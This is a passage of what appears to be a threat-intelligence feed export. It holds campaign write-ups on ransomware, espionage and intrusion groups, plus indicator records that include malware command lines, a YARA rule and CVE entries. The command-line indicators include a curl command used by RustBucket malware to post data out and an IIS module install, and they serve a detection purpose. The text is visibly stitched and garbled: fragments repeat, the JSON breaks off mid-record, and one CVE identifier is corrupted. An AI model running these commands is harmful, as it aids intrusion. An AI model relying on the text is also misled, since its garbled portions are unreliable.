One of their 'famous' attacks was the attack on the US Democratic National Committee in 2015. Political think-tanks, Government Ministries and political organizations that could threaten the Russian Federation are targeted to collect information from to assist in foreign and security political decision making. \r\n\r\nThe well-sourced group is using an arsenal of malware-families and toolkits to compromise their victims. Examples are CloudDuke, CosmicDuke, CozyDuke, HammerDuke but also COTS implementations of CobaltStrike and Mimikatz.\r\n\r\nMany of their campaigns align with political or foreign affair events that are of interest of the Russian Federation.

They also installed an OpenSSH server for persistence and established a reverse SSH tunnel to their server on a VPS.\r\n\r\nUsing the tunnel, they connected to the domain controller, used Impacket tools for discovery, and changed firewall settings on a remote server. They furthered lateral movement using Impackets wmiexec.py, deploying NetSupport malware to remote hosts. They scheduled tasks for persistence and issued discovery commands.\r\n\r\nThe next day, they deployed NetSupport on a domain controller and dumped the NTDS.dit database, likely exfiltrating it.

There is some correlation between the LV Ransomware and REvil Ransomware, but not enough evidence for an accurate conclusion. The exact nature of the relationship between the REvil group and LV ransomware group cannot be verified or established, and It does not appear the LV Ransomware group has access to the REvil Ransomware source code. There is a surge in the number of breaches undertaken by this ransomware group. The threat actor has compromised the corporate environment of a Jordan-based company. It utilized a double-extortion technique to blackmail its victims, encrypting victim files and threatening to release the stolen data if the ransom is not paid. \r\n\r\nThe Initial access of this attack began on the exchange servers in the targeted environment, where a web shell was dropped in the public access folders via the ProxyShell exploit. The adversary has utilized a malicious PowerShell backdoor to download and execute another file in the server from a malicious IP address. This threat actor utilizes Mimikatz to dump credentials, while NetScan and Advanced Port Scanner were used for discovery. Once access was obtained to the domain controller via Remote Desktop Protocol (RDP), the ransomware files were dropped on the server. A malicious group policy containing a malicious scheduled task was created to execute the ransomware from a shared folder hosted on the Domain Controller Server. The malicious group policy was utilized to run malicious batch files to deploy ransomware on the other machines connected to the domain controller and disable various security agents on targeted machines. The attacker then deleted the scripts' folder that contained malicious file samples and dropped a ransom note showing that the files were encrypted. \r\n\r\nThe Trellix Threat Intelligence Group (TIG) gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

Two of the most critical vulnerabilities, CVE-2023-40044 and CVE-2023-42657, received high CVSS scores. The attacks involve multi-stage chains that start with exploitation and then initiate commands to download payloads from remote servers, often via IP-literal URLs.\r\n\r\nIn the first attack chain, encoded PowerShell and certutil were used to download the payload from the server, categorized as a Metasploit stager. It involves checking the system architecture, disabling PowerShell logging, decoding and executing Base64-encoded, Gzip-compressed strings, and launching them as new processes.\r\n\r\nThe second attack chain utilized curl to download a payload executed with cl.exe, dynamically compiling it at runtime. The final payload could not be verified due to unavailable tmpfiles[.]org files, associated with Burp Suite's Collaborator product for API security testing.\r\n\r\nThe third attack chain employed various Windows executables in the server's ProgramData path, with a call to PowerShell but no scripts. Instead, commands were invoked by executables with short names.\r\n\r\nOrganizations using Progress' WS_FTP should promptly update or disable affected systems.

Analysis from Threatray showed that several variations of the RAT have been found in the wild. These variants, while clearly reusing big chunks of TigerRAT code, are composed of different smaller subsets of functionality of the original.

Ryuk is used exclusively in targeted ransomware attacks. \r\nRyuk was first observed in August 2018 during a campaign that targeted several enterprises. Analysis of the initial versions of the ransomware by our team revealed similarities and shared source code with the Hermes ransomware. Hermes ransomware is a commodity malware for sale on underground forums and has been used by multiple threat actors.\r\nBecause of the targeted nature of Ryuk infections, the initial infection vectors are tailored to the victim. Often seen initial vectors are spear-phishing emails, exploitation of compromised credentials to remote access systems and the use of previous commodity malware infections. As an example of the latter, the combination of Emotet and TrickBot has been frequently observed distributing Ryuk, though recently BazarLoader has also been seen distributing it. To encrypt files, Ryuk utilizes a combination of symmetric AES (256-bit) encryption and asymmetric RSA (2048-bit or 4096-bit) encryption. The symmetric key is used to encrypt the file contents, while the asymmetric public key is used to encrypt the symmetric key. Upon payment of the ransom the corresponding asymmetric private key is released, allowing the encrypted files to be decrypted","threat_level_id":1,"kb_article_link":"https://kcm.trellix.com/corporate/index?page=content&id=KB92422","coverage":{"dat_version":{"min":4117},"linux_dat_version":{"min":4647}},"updated_on":"2023-04-11T15:00:05.000Z","external_analysis":{"links":["https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ryuk-ransomware-attack-rush-to-attribution-misses-the-point/","https://github.com/advanced-threat-research/Yara-Rules/blob/master/ransomware/RANSOM_Ryuk.yar","https://us-cert.cisa.gov/ncas/alerts/aa20-302a","https://www.intel471.com/blog/understanding-the-relationship-between-emotet-ryuk-and-trickbot","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/new-ryuk-ransomware-sample%E2%80%AFtargets-webservers/","https://www.crowdstrike.com/blog/sidoh-wizard-spiders-mysterious-exfiltration-tool/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf","https://news.sophos.com/en-us/2020/10/14/inside-a-new-ryuk-ransomware-attack/","https://news.sophos.com/en-us/2020/10/28/hacks-for-sale-inside-the-buer-loader-malware-as-a-service/","https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/","https://thedfirreport.com/2020/10/08/ryuks-return/","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/","https://www.trendmicro.com/en_ie/what-is/ransomware/ryuk-ransomware.html","https://www.trendmicro.com/en_us/research/18/k/trickbot-shows-off-new-trick-password-grabber-module.html?_ga=2.114085703.1180523619.1642020410-528991333.1642020410","https://unit42.paloaltonetworks.com/unit42-malware-team-malspam-pushing-emotet-trickbot/","https://www.trendmicro.com/content/dam/trendmicro/global/en/research/21/k/a-review-and-analysis-of-2021-buer-loader-campaigns/TechnicalBrief-An-Analysis-of-Buer-Loader.pdf","https://research.checkpoint.com/2018/emotet-tricky-trojan-git-clones/","https://www.huntandhackett.com/blog/advanced-ip-scanner-the-preferred-scanner-in-the-apt-toolbox"]},"is_coat":1,"created_on":"2020-02-27T15:31:16.000Z"}]},{"id":"011f9153-61ae-40a2-a43b-b59f2e512a76","type":"command-line","category":"Other","value":"%WINDIR%\\system32\\inetsrv\\appcmd.exe add module /name: \"HttpSessionModule\" /type: \"HttpSessionModule.

The analysis has uncovered that the breach lasted 11 days, and was initiated by a phishing email where a password protected malicious ISO Zipped file was shared. Once the victim unzipped the ISO and executed it, windows would mount it as a CD or external media, and the victim would be presented access to its contents, which in this case was a single file, named \"documents\". This file, when executed, also executes the hidden BumbleBee malware loader.\r\n\r\nOnce BumbleBee was fully up and running, it contacts its C2, where it kept for a while just communicating. The DFIR Report, reported that 3 hours later, the BumbleBee drops the first stage cobalt strike beacon. This beacon once executed it started to inject into other processes on the host. From these injected processes, the attackers then started the discovery and enumeration tasks. At the 4 hours mark from the initial access, the attacker RDP into a server with a local administrator account, downloaded AnyDesk to maintain persistence, and finally started the Active directory discovery using AdFind.\r\n\r\nIn the subsequent days the intruders dropped a number of tools to help with privilege escalation, although they had managed to move laterally to a number of workstations and one server, it did not seem they had the privileges they were searching for.\r\n\r\nOn the last day the attackers used PowerShell to download and run a new Cobalt Strike PowerShell Beacon, using this new beacon to inject into processes and execute the PowerShell Invoke-Kerberoast module, to request a service account Kerberos ticket that would allow them to crack the password for the service account offline. The attackers also dropped two batch scripts with the purpose of identifying all online servers and workstations in the environment.\r\n\r\nWith the cracked password of the service account the attackers were able to execute a Cobalt Strike beacon on a Domain Controller, but were shortly after evicted from the environment before they could apply the final actions which from their previous actions the indication was that it would be a domain wide ransom deployment.\r\n\r\nThe Trellix ATR Team gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

Ryuk is used exclusively in targeted ransomware attacks. \r\nRyuk was first observed in August 2018 during a campaign that targeted several enterprises. Analysis of the initial versions of the ransomware by our team revealed similarities and shared source code with the Hermes ransomware. Hermes ransomware is a commodity malware for sale on underground forums and has been used by multiple threat actors.\r\nBecause of the targeted nature of Ryuk infections, the initial infection vectors are tailored to the victim. Often seen initial vectors are spear-phishing emails, exploitation of compromised credentials to remote access systems and the use of previous commodity malware infections. As an example of the latter, the combination of Emotet and TrickBot has been frequently observed distributing Ryuk, though recently BazarLoader has also been seen distributing it. To encrypt files, Ryuk utilizes a combination of symmetric AES (256-bit) encryption and asymmetric RSA (2048-bit or 4096-bit) encryption. The symmetric key is used to encrypt the file contents, while the asymmetric public key is used to encrypt the symmetric key. Upon payment of the ransom the corresponding asymmetric private key is released, allowing the encrypted files to be decrypted","threat_level_id":1,"kb_article_link":"https://kcm.trellix.com/corporate/index?page=content&id=KB92422","coverage":{"dat_version":{"min":4117},"linux_dat_version":{"min":4647}},"updated_on":"2023-04-11T15:00:05.000Z","external_analysis":{"links":["https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ryuk-ransomware-attack-rush-to-attribution-misses-the-point/","https://github.com/advanced-threat-research/Yara-Rules/blob/master/ransomware/RANSOM_Ryuk.yar","https://us-cert.cisa.gov/ncas/alerts/aa20-302a","https://www.intel471.com/blog/understanding-the-relationship-between-emotet-ryuk-and-trickbot","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/new-ryuk-ransomware-sample%E2%80%AFtargets-webservers/","https://www.crowdstrike.com/blog/sidoh-wizard-spiders-mysterious-exfiltration-tool/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf","https://news.sophos.com/en-us/2020/10/14/inside-a-new-ryuk-ransomware-attack/","https://news.sophos.com/en-us/2020/10/28/hacks-for-sale-inside-the-buer-loader-malware-as-a-service/","https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/","https://thedfirreport.com/2020/10/08/ryuks-return/","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/","https://www.trendmicro.com/en_ie/what-is/ransomware/ryuk-ransomware.html","https://www.trendmicro.com/en_us/research/18/k/trickbot-shows-off-new-trick-password-grabber-module.html?_ga=2.114085703.1180523619.1642020410-528991333.1642020410","https://unit42.paloaltonetworks.com/unit42-malware-team-malspam-pushing-emotet-trickbot/","https://www.trendmicro.com/content/dam/trendmicro/global/en/research/21/k/a-review-and-analysis-of-2021-buer-loader-campaigns/TechnicalBrief-An-Analysis-of-Buer-Loader.pdf","https://research.checkpoint.com/2018/emotet-tricky-trojan-git-clones/","https://www.huntandhackett.com/blog/advanced-ip-scanner-the-preferred-scanner-in-the-apt-toolbox"]},"is_coat":1,"created_on":"2020-02-27T15:31:16.000Z"}]},{"id":"01c5484e-aa7f-4b85-84aa-16dd4a2cf704","type":"command-line","category":"Other","value":"curl -A cur1-agent -L %s -s -d dacurl -A cur1-agent -L %s -s -d dl","comment":"","description":"Command line and option related to a software malicious or not to execute specific commands.","mitre_techniques":[{"type":"mitre-attack-pattern","value":"Windows Command Shell - T1059.003"}],"rule_type":null,"campaigns":[{"id":"eba449e5-347a-4dac-b71c-11bcb55df28c","name":"North Korean Bluenoroff Group Utilizes RustBucket Malware For Targeting MacOS Platform","description":"A recent campaign, attributed to Bluenoroff, was seen targeting fintech companies in the US and Asian countries.

Once a victim has been compromised, a ransom note is dropped by the malware reporting that in addition to encrypting files the threat actor has also exfiltrated private data including financial, personal, and network information. The ransom note further instructs the victim to a dark web address to regain access to their encrypted data. In more recent attacks, the threat actor has threatened to publish confidential data that has been exfiltrated if the ransom is not met within the time frame set by the threat actor. \r\n\r\nAfter the initial discovery in 2020, LockBit ransomware has evolved to the most prolific ransomware family in 2022. Largely due to harboring competent affiliates from the closed down REvil and Conti ransomware groups. \r\n\r\nThe Lockbit group has improved their ransomware binary to a version 3.0, in which they incorporated several techniques that were previously observed in BlackMatter ransomware. \r\n\r\nFurthermore to aid their data exfiltration efforts, LockBit has developed their own data exfiltration tool called StealBit. However, Trellix has observed several other data exfiltration tools being used, like Rclone and MegaSync. \r\n\r\nA LockBit attack will almost always include several other malicious and/or non-malicious (the so called dual use) tools. Therefore, we strongly suggest to not only focus on the actual LockBit binary but to be aware of any suspicious behavior linked to any of the tools and Command-line arguments listed in this profile.","threat_level_id":1,"kb_article_link":null,"coverage":{"dat_version":{"min":4110},"linux_dat_version":{"min":5031}},"updated_on":"2023-07-11T05:11:49.000Z","external_analysis":{"links":["https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/tales-from-the-trenches-a-lockbit-ransomware-story/","https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/","https://www.cisa.gov/uscert/ncas/current-activity/2022/02/07/fbi-releases-indicators-compromise-associated-lockbit-20","https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-lockbit","https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/","https://blog.cyble.com/2023/06/06/lockbit-ransomware-2-0-resurfaces/","https://www.cisa.gov/news-events/alerts/2023/06/14/cisa-and-partners-release-joint-advisory-understanding-ransomware-threat-actors-lockbit","https://www.cisa.gov/sites/default/files/2023-06/aa23-165a_understanding_TA_LockBit.pdf","https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a"]},"is_coat":1,"created_on":"2020-06-12T14:15:23.000Z"}]},{"id":"01fddb72-9719-42dc-aa57-36e651b9e236","type":"command-line","category":"Other","value":"cmd /c sc query wpcsvc","comment":"","description":"Command line and option related to a software malicious or not to execute specific commands.","mitre_techniques":[{"type":"mitre-attack-pattern","value":"Windows Command Shell - T1059.003"}],"rule_type":null,"campaigns":[{"id":"032c15bc-d75e-4ddb-ab26-e27704b31b4c","name":"APT37 Possibly Linked To STIFF#BIZON Campaign","description":"The APT37 threat group may be behind an attack campaign targeting high-value entities in the Czech Republic, Poland, and other countries.

At the 4 hours mark from the initial access, the attacker RDP into a server with a local administrator account, downloaded AnyDesk to maintain persistence, and finally started the Active directory discovery using AdFind.\r\n\r\nIn the subsequent days the intruders dropped a number of tools to help with privilege escalation, although they had managed to move laterally to a number of workstations and one server, it did not seem they had the privileges they were searching for.\r\n\r\nOn the last day the attackers used PowerShell to download and run a new Cobalt Strike PowerShell Beacon, using this new beacon to inject into processes and execute the PowerShell Invoke-Kerberoast module, to request a service account Kerberos ticket that would allow them to crack the password for the service account offline. The attackers also dropped two batch scripts with the purpose of identifying all online servers and workstations in the environment.\r\n\r\nWith the cracked password of the service account the attackers were able to execute a Cobalt Strike beacon on a Domain Controller, but were shortly after evicted from the environment before they could apply the final actions which from their previous actions the indication was that it would be a domain wide ransom deployment.\r\n\r\nThe Trellix ATR Team gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

Nothing like coming back to the cyber world screeching about intelligence leaks, critical vulnerabilities, and breaches. It’s as if we should be asking “who has not been breached these days?” 3CX made the news early in April via a supply chain attack, Uber’s driver data was stolen via the breach on Genova Burns LLC and now MSI has been compromised. Fear not! It’s not all doom and gloom, as the Trellix Advanced Research Center helped take down one of the largest online markets for illegal activities and content.\r\n\r\nOrganizations looking to avoid having their names wind up in similar headlines have come to the right place, as the Bug Report promises to the answer the questions, “What is it?” “Who cares?” and “What can I do?” for the top vulnerabilities each month. As promised, let’s say hello to this month’s list of faulty bugs!\r\n\r\nCVE-2023-28205: macOS, iOS, iPadOS, and Safari\r\nCVE-2023-29389: 2021 Toyota RAV4\r\nCVE-2023-2825%WINDIR%\\Common Log File System (CLFS)\r\nCVE-2023-2033: Google Chrome and Chromium\r\n\r\n\r\nCVE-2023-28205: One bite of the Apple\r\n\r\nWhat is it?\r\n\r\nLooks like Google’s Clément Lecigne is on a roll with Apple-related CVEs, this being his third major find in just two years. This vulnerability is a use-after-free in Webkit, a browser engine used in Safari, iOS, iPadOS, and macOS to render online content. The vuln can be triggered via a malicious HTML page embedded with a JavaScript payload, leading to arbitrary code execution with elevated privileges.\r\n\r\nWho cares?\r\n\r\nA wide range of devices running iOS, iPadOS, Safari, and macOS are vulnerable, placing the majority of Apple’s customers firmly in the “I care” column. You may be surprised to learn that the iPod Touch was among the vulnerable products that have been patched. Frankly, I had to research if iPods are still even a thing—I must be getting old.\r\n\r\nIt should also be noted that the researchers who reported this bug to Apple apparently discovered it being used in the wild, although neither they nor Apple have released any details regarding the nature of this exploitation as of yet.\r\n\r\nWhat can I do?\r\n\r\nThankfully, Apple has already patched this vulnerability with the release of versions 15.7.5 and 16.4.1 for iOS, iPadOS, and Safari and the release of macOS Ventura 13.3.1. If you’ve somehow survived this long without knowing how to update your Apple devices, Apple provides support pages on how to accomplish this for both mobile and desktop.\r\n\r\n\r\nCVE-2023-29389: 2021 Toyota RAV4, now with keyless entry\r\n\r\nWhat is it?\r\n\r\nAt the risk of sounding entitled, would it be possible for Toyota to ensure their vehicles don’t automatically trust messages from other ECUs via the CAN bus? Unfortunately, I don’t think the folks at Toyota can hear my request, since it’s still possible to use this type of attack on any 2021 Toyota RAV4 (and potentially other vehicles—see below). Simply access the headlight connector behind the bumper and send a \"Key is validated\" message via CAN injection, and now you can control the vehicle.\r\n\r\nKen Tindell, CTO of Canis Automotive Labs, and his friend Ian Tabor discovered this vulnerability after Ian’s RAV4 was stolen off the street back in July of last year after a couple of failed attempts in April, meaning criminals have been using this vulnerability for at least a year. In his blog, Ken notes that although the CVE description explicitly names the 2021 Toyota RAV4 as the vulnerable product, “this is not something specific to Toyota: Ian investigated the RAV4 because his stolen car was a RAV4, and other manufacturers have car models that can be stolen in a similar way.” In fact, the theft device they reverse-engineered to discover the vulnerability claims to support “Lexus models including the ES, LC, LS, NX, RX and Toyota models including the GR Supra, Prius, Highlander, Land Cruiser - and RAV4.”\r\n\r\nWho cares?\r\n\r\nIn 2021, Toyota sold 407,739 RAV4’s in the U.S alone. While it may not be assumed that all of those were 2021 models given how car release cycles are implemented, it is still a significant number of vehicles that may be vulnerable to CAN injection hijacking. If Ken Tindell’s claim that this vulnerability affects various other Lexus and Toyota models is to be believed, it’s possible this number could be in the millions. A threat actor compromising a vehicle via this method could endanger the public or the driver’s life—or, more likely, use it to unlock and steal the car right off the street in minutes.\r\n\r\nWhat can I do?\r\n\r\nCurrently there is no patch available from Toyota. So… secure your vehicle? Have it insured? Forgo electronic vehicles entirely? Jokes aside, without a patch from Toyota, your best bet is probably to avoid leaving your RAV4 on the street at night and park in the garage for the time being. If you need to park on the street, utilize a steering wheel lock to make your vehicle a less attractive target for carjackers.\r\n\r\n\r\nCVE-2023-28252: Gang Gang CLFS\r\n\r\nWhat is it?\r\n\r\nNothing like jumping into another zero-day found in the Windows driver for its Common Log File System (CLFS), which seems to be a common target for vulnerabilities as of late. For those that don’t know, CLFS is a subsystem utilized by both the kernel and user space applications to, among other things, log transactions to the disk in the form of a Base Log File.\r\n\r\nCVE-2023-28252 can be exploited by malforming the Base Log File’s fields enough to cause an out-of-bounds write when the driver processes it. Once the vulnerability is triggered, the attacker may use the exposed kernel structures to execute malicious code with system privileges.\r\n\r\nWho cares?\r\n\r\nDo you run Windows in enterprise environments? Maybe even just at home? If you own one of the billions of devices worldwide that run Windows, congratulations, you are vulnerable!\r\n\r\nTo be fair, the CLFS data structures are old and have had several vulnerabilities attributed to them since 2018. The pressing matter with this CVE is that it has been exploited in the wild by cybercriminals to deploy Nokoyawa ransomware.\r\n\r\nWhat can I do?\r\n\r\nGiven the fact that this vulnerability is being exploited in the wild to deliver ransomware, it is recommended to patch your systems as soon as possible. You can find the patch details here.\r\n\r\n\r\nCVE-2023-2033: V8 fragged out\r\n\r\nWhat is it?\r\n\r\nIt looks like Google’s Clément Lecigne isn’t content with finding bug after bug in Apple’s Webkit and has also set his sights on Google’s own V8 Javascript engine, used in Google Chrome and other Chromium-based browsers like Edge and Opera. CVE-2023-2033 is yet another type confusion bug in V8, this one affecting all versions of Chrome prior to 112.0.5616.121. Wow, that was a mouth full; maybe we can get a bit more streamlined with version numbers instead of APT naming conventions.\r\n\r\nWho cares?\r\n\r\nGoogle stated that it is aware this CVE has been exploited in the wild. Thus, I think most of us care at this point, whether we like it or not. I tried not to, but I somehow found myself using Google Chrome again. In fact, I now have 128 GB of RAM to safely use a window with a single tab in Chrome. Don’t act like Firefox is any better; I had so many plugins that I had to migrate it to one of those enterprise servers with a terabyte of RAM.\r\n\r\nWhat can I do?\r\n\r\nGiven that this vulnerability has been observed being exploited in the wild, the best course of action is to patch ASAP. You can start by consulting Google’s Chrome Releases for more details. According to the Chromium Security page, these releases also apply to the Chromium project and, by extension, Chromium-based browsers that aren’t Chrome.","threat_level_id":2,"kb_article_link":null,"coverage":null,"updated_on":"2023-05-09T14:57:58.000Z","external_analysis":{"links":["https://www.trellix.com/en-us/about/newsroom/stories/research/the-bug-report-april-2023-edition.html"]},"is_coat":0,"created_on":"2023-05-09T14:57:58.000Z"}]},{"id":"025442d7-0091-4a2a-9d55-42516b1cdfe1","type":"yara","category":"Payload delivery","value":"rule M_Methodology_MicroSCADA_Path_Strings\r\n\r\n{\r\n\r\n     meta:\r\n\r\n          author = \"Mandiant\"\r\n\r\n          date = \"2023-02-27\"\r\n\r\n          description = \"Searching for files containing references to MicroSCADA filesystem path containing native MicroSCADA binaries and resources.\" \r\n\r\n          disclaimer = \"This rule is for hunting purposes only and has not been tested to run in a production environment.\"\r\n\r\n \r\n\r\n     strings:\r\n\r\n          $s1 = \"sc\\\\prog\\\\exec\" nocase ascii wide\r\n\r\n \r\n\r\n     condition:\r\n\r\n          filesize < 1MB and\r\n\r\n          $s1\r\n\r\n}","comment":"M_Methodology_MicroSCADA_Path_Strings","description":"","mitre_techniques":[],"rule_type":null,"campaigns":[{"id":"1a30bf0b-f1e4-46b9-a496-97edde090f71","name":"Sandworm Targeted Ukrainian Critical Infrastructure With New Variant Of CaddyWiper","description":"In a late 2022 incident, researchers responded to a cyber-physical attack by the Russia-linked threat actor Sandworm, targeting a Ukrainian critical infrastructure organization. The attack comprised multiple events and employed a novel technique to impact industrial control systems (ICS) and operational technology (OT). Sandworm initially used OT-level living-off-the-land (LotL) techniques to likely trip the victim’s substation circuit breakers, causing a power outage concurrent with mass missile strikes on Ukraine's critical infrastructure. In a subsequent event, Sandworm deployed a new variant of CaddyWiper in the victim’s IT environment. This incident highlights the evolving capabilities of Russia’s cyber-physical attack strategy, demonstrating maturity in offensive OT tactics and the ability to recognize and exploit novel threat vectors. The use of LotL techniques suggests efficiency in executing cyber-physical attacks. While the initial intrusion point remains undetermined, the analysis suggests that the OT component may have been developed in as little as two months, indicating the threat actor's capability to quickly adapt and target various OT systems worldwide.\r\n\r\nThe Trellix Threat Intelligence Group (TIG) gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

This malware was found on compromised computers within the organization. MataDoor was designed to be stealthy, with executable file names similar to legitimate software and valid digital signatures. It also employed the Themida protector to evade detection.\r\n\r\nAnalysis of MataDoor revealed it to be a sophisticated modular backdoor. It is believed that the malware was introduced into the system through a phishing email that contained a DOCX document. This document exploited the CVE-2021-40444 vulnerability, suggesting that it was the initial entry point for the backdoor.\r\n\r\nMataDoor operates as a DLL and exports both the DllMain and DllRegisterServer functions. This allows the malware to run when invoked through the standard Windows Regsvr32 program. Essentially, these functions serve the same purpose, initializing the backdoor and executing its main logic in a separate thread.\r\n\r\nIn all known cases, MataDoor relies on a loader service to run, which automatically starts with the system, ensuring the backdoor's persistence. This loader service simply launches the backdoor DLL, and its configuration, like that of the backdoor, is encrypted using the AES algorithm in cipher feedback (CFB) mode.\r\n\r\nThe Trellix Threat Intelligence Group (TIG) gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

Over the Memorial Day weekend in the US, Volexity conducted an incident response with some of its clients due to the detection of suspicious activity. The activity was of webshells being written to disk, and the analysis uncovered that this access had stemmed from a vulnerability being exploited that resulted in remote code execution. Following the discovery and verification, Atlassian was informed and later confirmed that indeed its software contained a vulnerability. Since then, the vulnerability has officially been assigned the identifier CVE-2022-26134.\r\n\r\nThe vulnerability allows unauthenticated remote code execution on the server where Confluence is installed. The attacker is believed to exploit the shell by sending a specially crafted packet that contains the command to be executed. The attacker then loaded \"Behinder\" webshell directly into memory, so it does not need to keep exploiting the vulnerability in subsequent interactions. This webshell runs fully in memory and so it does not survive reboots. For this reason, attackers used the in memory webshell to download and write to disk two other webshells, China Chopper and a custom file upload webshells, in case the victims rebooted the server.\r\n\r\nThe Trellix ATR Team gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

Once a victim has been compromised, a ransom note is dropped by the malware reporting that in addition to encrypting files the threat actor has also exfiltrated private data including financial, personal, and network information. The ransom note further instructs the victim to a dark web address to regain access to their encrypted data. In more recent attacks, the threat actor has threatened to publish confidential data that has been exfiltrated if the ransom is not met within the time frame set by the threat actor. \r\n\r\nAfter the initial discovery in 2020, LockBit ransomware has evolved to the most prolific ransomware family in 2022. Largely due to harboring competent affiliates from the closed down REvil and Conti ransomware groups. \r\n\r\nThe Lockbit group has improved their ransomware binary to a version 3.0, in which they incorporated several techniques that were previously observed in BlackMatter ransomware. \r\n\r\nFurthermore to aid their data exfiltration efforts, LockBit has developed their own data exfiltration tool called StealBit. However, Trellix has observed several other data exfiltration tools being used, like Rclone and MegaSync. \r\n\r\nA LockBit attack will almost always include several other malicious and/or non-malicious (the so called dual use) tools.

Once a victim has been compromised, a ransom note is dropped by the malware reporting that in addition to encrypting files the threat actor has also exfiltrated private data including financial, personal, and network information. The ransom note further instructs the victim to a dark web address to regain access to their encrypted data. In more recent attacks, the threat actor has threatened to publish confidential data that has been exfiltrated if the ransom is not met within the time frame set by the threat actor. \r\n\r\nAfter the initial discovery in 2020, LockBit ransomware has evolved to the most prolific ransomware family in 2022. Largely due to harboring competent affiliates from the closed down REvil and Conti ransomware groups. \r\n\r\nThe Lockbit group has improved their ransomware binary to a version 3.0, in which they incorporated several techniques that were previously observed in BlackMatter ransomware. \r\n\r\nFurthermore to aid their data exfiltration efforts, LockBit has developed their own data exfiltration tool called StealBit. However, Trellix has observed several other data exfiltration tools being used, like Rclone and MegaSync. \r\n\r\nA LockBit attack will almost always include several other malicious and/or non-malicious (the so called dual use) tools. Therefore, we strongly suggest to not only focus on the actual LockBit binary but to be aware of any suspicious behavior linked to any of the tools and Command-line arguments listed in this profile.","threat_level_id":1,"kb_article_link":null,"coverage":{"dat_version":{"min":4110},"linux_dat_version":{"min":5031}},"updated_on":"2023-07-11T05:11:49.000Z","external_analysis":{"links":["https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/tales-from-the-trenches-a-lockbit-ransomware-story/","https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/","https://www.cisa.gov/uscert/ncas/current-activity/2022/02/07/fbi-releases-indicators-compromise-associated-lockbit-20","https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-lockbit","https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/","https://blog.cyble.com/2023/06/06/lockbit-ransomware-2-0-resurfaces/","https://www.cisa.gov/news-events/alerts/2023/06/14/cisa-and-partners-release-joint-advisory-understanding-ransomware-threat-actors-lockbit","https://www.cisa.gov/sites/default/files/2023-06/aa23-165a_understanding_TA_LockBit.pdf","https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a"]},"is_coat":1,"created_on":"2020-06-12T14:15:23.000Z"}]},{"id":"03c2358a-b7b8-40b4-9d12-bdc2fd58e8ba","type":"vulnerability","category":"External analysis","value":"CVE-2021-26855","comment":"ProxyLogon Vulnerabilities","description":"","mitre_techniques":[],"rule_type":null,"campaigns":[{"id":"7b4959d5-516e-4534-a16c-12498df7fc73","name":"New Wave Of Espionage Activity Targets Asian Governments","description":"Symantec has reported that a distinct group of espionage attackers who were earlier associated with ShadowPad remote access Trojan (RAT) have now adopted a new and diverse toolset.

Hermes ransomware is a commodity malware for sale on underground forums and has been used by multiple threat actors.\r\nBecause of the targeted nature of Ryuk infections, the initial infection vectors are tailored to the victim. Often seen initial vectors are spear-phishing emails, exploitation of compromised credentials to remote access systems and the use of previous commodity malware infections. As an example of the latter, the combination of Emotet and TrickBot has been frequently observed distributing Ryuk, though recently BazarLoader has also been seen distributing it. To encrypt files, Ryuk utilizes a combination of symmetric AES (256-bit) encryption and asymmetric RSA (2048-bit or 4096-bit) encryption. The symmetric key is used to encrypt the file contents, while the asymmetric public key is used to encrypt the symmetric key. Upon payment of the ransom the corresponding asymmetric private key is released, allowing the encrypted files to be decrypted","threat_level_id":1,"kb_article_link":"https://kcm.trellix.com/corporate/index?page=content&id=KB92422","coverage":{"dat_version":{"min":4117},"linux_dat_version":{"min":4647}},"updated_on":"2023-04-11T15:00:05.000Z","external_analysis":{"links":["https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ryuk-ransomware-attack-rush-to-attribution-misses-the-point/","https://github.com/advanced-threat-research/Yara-Rules/blob/master/ransomware/RANSOM_Ryuk.yar","https://us-cert.cisa.gov/ncas/alerts/aa20-302a","https://www.intel471.com/blog/understanding-the-relationship-between-emotet-ryuk-and-trickbot","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/new-ryuk-ransomware-sample%E2%80%AFtargets-webservers/","https://www.crowdstrike.com/blog/sidoh-wizard-spiders-mysterious-exfiltration-tool/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf","https://news.sophos.com/en-us/2020/10/14/inside-a-new-ryuk-ransomware-attack/","https://news.sophos.com/en-us/2020/10/28/hacks-for-sale-inside-the-buer-loader-malware-as-a-service/","https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/","https://thedfirreport.com/2020/10/08/ryuks-return/","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/","https://www.trendmicro.com/en_ie/what-is/ransomware/ryuk-ransomware.html","https://www.trendmicro.com/en_us/research/18/k/trickbot-shows-off-new-trick-password-grabber-module.html?_ga=2.114085703.1180523619.1642020410-528991333.1642020410","https://unit42.paloaltonetworks.com/unit42-malware-team-malspam-pushing-emotet-tric